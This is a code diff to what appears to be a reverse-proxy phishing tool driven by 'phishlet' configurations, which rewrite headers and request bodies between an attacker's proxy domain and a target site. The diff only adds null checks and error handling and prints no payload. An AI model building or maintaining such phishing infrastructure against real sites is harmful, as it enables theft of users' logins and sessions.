@@ -147,11 +147,27 @@ def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
                 headers_dict[key] = new_values
     
     print(f"phishlet_data_for_headers: {phishlet_data} \n")
-    # one more tim go throught all headers and replace proxy host domain with target host domain\
-    proxy_domain = phishlet_data.get('proxy_domain', '')
-    target_url = phishlet_data.get('target_url', '')
-    target_domain = target_url.split('//')[1].split('/')[0]
-    print(f"proxy_host: {proxy_domain}, target_host: {target_domain}")
+    
+    # Check if phishlet_data exists before accessing its properties
+    if phishlet_data:
+        # one more time go through all headers and replace proxy host domain with target host domain
+        proxy_domain = phishlet_data.get('proxy_domain', '')
+        target_url = phishlet_data.get('target_url', '')
+        
+        if target_url and '//' in target_url:
+            try:
+                target_domain = target_url.split('//')[1].split('/')[0]
+                print(f"proxy_host: {proxy_domain}, target_host: {target_domain}")
+            except (IndexError, AttributeError):
+                print(f"Warning: Could not parse target_url: {target_url}")
+                target_domain = ''
+        else:
+            print(f"Warning: Invalid target_url format: {target_url}")
+            target_domain = ''
+    else:
+        print("No phishlet data available for header processing")
+        proxy_domain = ''
+        target_domain = ''
     # for key, value in headers_dict.items():
     #     if isinstance(value, str) and proxy_domain in value:
     #         headers_dict[key] = value.replace(proxy_domain, target_domain)
@@ -267,6 +283,10 @@ def apply_reverse_filter_to_request_body(request_body, phishlet_data, proxy_doma
         Modified request body with hostname replacements
     """
     if not request_body:
+        return request_body
+    
+    # Check if phishlet_data exists before accessing its properties
+    if not phishlet_data:
         return request_body
     
     # Check if reverse filter is enabled for any hosts
